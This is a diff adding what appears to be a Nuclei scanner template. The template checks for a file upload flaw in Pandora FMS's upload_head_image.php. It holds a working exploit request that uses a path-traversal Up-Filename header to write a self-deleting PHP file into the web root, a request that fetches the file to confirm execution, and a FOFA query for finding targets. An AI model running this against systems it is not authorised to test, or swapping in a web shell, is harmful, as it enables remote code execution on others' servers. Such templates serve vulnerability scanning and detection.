@@ -1,0 +1,37 @@
+id: pandora-fms-upload_head_image-fileupload
+
+info:
+  name: pandora-fms-upload_head_image-fileupload
+  author: unknow
+  severity: critical
+  description: pandora fms upload_head_image 存在文件上传漏洞。
+  tags: pandora,fileupload
+  metadata:
+    fofa-query: body="pandora_console/"
+
+http:
+  - raw:
+      - |
+        POST /pandora_console/enterprise/meta/general/upload_head_image.php?up=true HTTP/1.1
+        Host: 
+        Up-Filename: ../../../../../../../../../../var/www/html/pandora_console/extensions/{{filename}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+        <?php echo md5(233);unlink(__FILE__);?>
+
+      - |
+        GET /pandora_console/extensions/{{filename}} HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 
+
+        <?php echo md5(233);unlink(__FILE__);?>
+
+    payloads:
+      filename:
+        - "9CF7Ab.php"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2==200 && contains(body_2, "e165421110ba03099a1c0393373c5b43") && contains(header_2, "text/html")'
